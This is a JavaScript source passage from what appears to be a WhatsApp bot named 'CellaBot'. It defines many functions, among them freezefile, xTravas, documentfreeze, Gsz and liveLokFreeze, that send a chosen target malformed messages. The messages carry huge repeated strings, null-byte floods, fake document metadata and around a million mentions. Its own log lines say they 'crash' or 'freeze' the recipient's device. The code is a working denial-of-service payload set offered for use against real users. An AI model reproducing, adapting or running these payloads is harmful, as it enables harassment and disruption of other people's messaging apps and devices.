g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆g҉ ͆҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ\u200A ꦾ҉          𖣂𓍯̤\n" + "\n\n\n\n\n\n\n\n\n\n\n\n@6282332790754".repeat(27000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{}"
            },
            contextInfo: {
              mentionedJid: ["6282332790754@s.whatsapp.net"],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ""
                }
              }
            }
          }
        }
      }
    }, zLoc ? {
      participant: {
        jid: zLoc
      }
    } : {});
    console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ CelaCrash ⿻ ▾⭑"));
  }
async function freezefile(zLoc, ptcp = false) {
    let virtex = "🌸͜͞.⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤🌿" + "@1".repeat(250000);
    await CellaBot.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "🌿͜͞.⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤🌸",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
} 
    
async function xPokers(zLoc, ptcp = false) {
    let virtex = ".⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤☠️" + "@6282291664759".repeat(25000);
    await CellaBot.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "🦠.⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤☠️",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "6282291664759@s.whatsapp.ney"),
                        groupMentions: [{ groupJid: "6282291664759@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}
		
async function xTravas(zLoc, ptcp = false) {
    let virtex = "Cella";
    let buttons = Array.from({ length: 200 }, () => ({
        name: 'call_permission_request',
        buttonParamsJson: '{}'
    }));
    let overJids = Array.from({ length: 1039900 }, () => zLoc);
    
    await CellaBot.relayMessage(zLoc, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Xinn " }]
                    }
                }
            }
        },
        contextInfo: {
            mentionedJid: overJids,
            externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: false,
                title: `-> .⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤ `,
                body: `—??`,
                previewType: "VIDEO",
                thumbnail: "",
                sourceUrl: "https://byxzmods.com",
                mediaUrl: "https://byxzmods.com"
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}


async function Vulcanicx(zLoc, ptcp = false) {
    let virtex = "Cela " + "ꦾ".repeat(40000);
    await CellaBot.relayMessage(zLoc, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: Array(20).fill({
                            name: 'call_permission_request',
                            buttonParamsJson: '{}'
                        })
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}
        
        
async function NullX(zLoc, ptcp = false) {
    await CellaBot.relayMessage(zLoc, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " Halo Bro ",
                            format: "EXTENSIONS_1"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                            version: 3
                        }
                    }
                }
            }
        }, 
        ptcp ? { participant: { jid: zLoc } } : {}
    );
};
async function bakdok(zLoc, ptcp = false) {
 var etc = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `Cella DOCUMENT`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: zLoc, quoted: ptcp });
await CellaBot.relayMessage(target, etc.message, { participant: { jid: zLoc }, messageId: etc.key.id });
}
async function CallMsg(zLoc, ptcp = false) {
    await CellaBot.relayMessage(zLoc, {
                        "messageContextInfo": {
                            "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
                            "deviceListMetaData": {},
                            "deviceListMetadataVersion": 2
                        },
                        "scheduledCallCreationMessage": {
                            "scheduledTimestampMs": '1200',
                            callType: "AUDIO",
                            "title": ' # TrashDex - Explanation ' + '❗'.repeat(20000),
                        }
                    }, {
                        additionalAttributes: {
                            edit: '7'
                        }
                    })
                }


async function CaroUsel(zLoc, ptcp = false) {
      let etc = generateWAMessageFromContent(
        zLoc,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  locationMessage: {},
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑‌Cella Crash ‌",
                },
                nativeFlowMessage: {
                  name: "call_permission_request",
                  messageParamsJson: " ꦾ ",
                },
                carouselMessage: {},
              },
            },
          },
        }),
        {
          userJid: zLoc,
          quoted: m
        }
      );

      await CellaBot.relayMessage(
        zLoc,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: zLoc,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ CelaCrash ⿻ ▾⭑"));
    }
    
		async function TanggapanDiterima(zLoc, ptcp = false) {
			await CellaBot.relayMessage(zLoc, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: "CellaNuLL",
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zetxcza.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc
					}
				} : {}
			);
			console.log(chalk.green("Cella Attacked Someone! 😴"));
		};
		
  async function uidoc(zLoc, ptcp = false) {
    let uitext = "𝘼𝙩𝙩𝙖𝙘𝙠 𝙐𝙞" + "𑲭𑲭".repeat(50000);
    await CellaBot.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/pdf',
                            fileSha256: "NpR4V+tVc+N2p3zZgKO9Zzo/I7LrhNHlJxyDBxsYJLo=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                            fileName: "unidentifiedMessageType",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Xin x9 " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}
    
    // Freeze Speciality //
     async function locasiV2(zLoc, ptcp = false) {
   let mark = '0@s.whatsapp.net';
    await CellaBot.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Cella Bug" + "ꦾ".repeat(1099)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function locasifreeze(zLoc, ptcp = false) {
    await CellaBot.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Cela" + "@1".repeat(295000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function documentfreeze(zLoc, ptcp = false) {
    let uitext = ".⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤ " + "*~@1~*".repeat(50000);
    await CellaBot.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30473509_1487882801880114_6053807656786168970_n.enc?ccb=11-4&oh=01_Q5AaIAjozZG-7ebt_0VTalQg3jMRpk7lgF-rRdrUZ3BblPGJ&oe=676B61B9&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                            fileSha256: "dnFCD9DtW/8seNK1KK9RFO/qR7ODsmBI/fkfkybi55s=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                            fileName: ".⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤",
                            fileEncSha256: "0IrI30eGq8SQ0KSAmUWpPFCr9CIvoZRC/0PFbulTsFU=",
                            directPath: "/v/t62.7119-24/30473509_1487882801880114_6053807656786168970_n.enc?ccb=11-4&oh=01_Q5AaIAjozZG-7ebt_0VTalQg3jMRpk7lgF-rRdrUZ3BblPGJ&oe=676B61B9&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1732511963",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "footer" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function documentfreeze2(zLoc, ptcp = false) {
    let uitext = "Cella" +  "꧀ *~@1~*".repeat(50000);
    await CellaBot.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                            fileSha256: "7SXMgNYBO4tkPSk3W46FQ3hUcK6K6G3//TiB5/ibhwg=",
                            fileLength: "829710112",
                            pageCount: 0x9184e729fff,
                            mediaKey: "/gaasVF/Lt68CK4sy5DTRhJDQls+RwNDwU6yhGZjPCk=",
                            fileName: "@cella💸",
                            fileEncSha256: "nRvyfj/ky0+6upJrQMnwtuXm6lye2RuavfYM+cVl0hU=",
                            directPath: "v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4FC&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1732537847",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "footer" }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}


    async function Gsz(zLoc, ptcp = false) {
      await CellaBot.relayMessage(
        zLoc,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  locationMessage: {},
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⚝CellaForyou⚝" + "\u0000".repeat(900000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "",
                },
                carouselMessage: {},
              },
            },
          },
        },
        {
          participant: {
            jid: zLoc,
          },
        }
      );
      console.log(chalk.green("Send Bug By ⭑‌▾ ⿻ CelaCrash ⿻ ▾⭑"));
    }
    
async function uidoc2(zLoc, ptcp = false) {
    let akumw = "~Crash~" + "ꦿꦾ".repeat(50000);
    await CellaBot.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: " .⃟  𝗖𝗲𝗹͢𝗹𝗮𝗖𝗿͢𝗮𝘀𝗵😈⃤ ",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: akumw
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Credits to xin bro " }]
                    }
                }
            }
        }
    }, { participant: { jid: zLoc } }, { messageId: null });
}

async function liveLokFreeze(zLoc, ptcp = false) {
        let xcl = "ꪶ𖣂ꫂ xCella 厷"+"𑲭𑲭".repeat(77777) + "@1".repeat(77777);
var etc = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": xcl,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     },
     body: {
     text: "virtex"
     },
     nativeFlowMessage: {},
     contextInfo: {
     mentionedJid: ["6285805338638@s.whatsapp.net"],
     groupMentions: [{ groupJid: "120363321763581234@newsletter", groupSubject: xcl }]
     }
  }
}
}), { userJid: zLoc, quoted: m })
await CellaBot.relayMessage(zLoc, etc.message, { participant: { jid: zLoc }, messageId: etc.key.id })
console.log(chalk.red.bold('Crash System Device By Cella'))
}

// Ios Speciality //
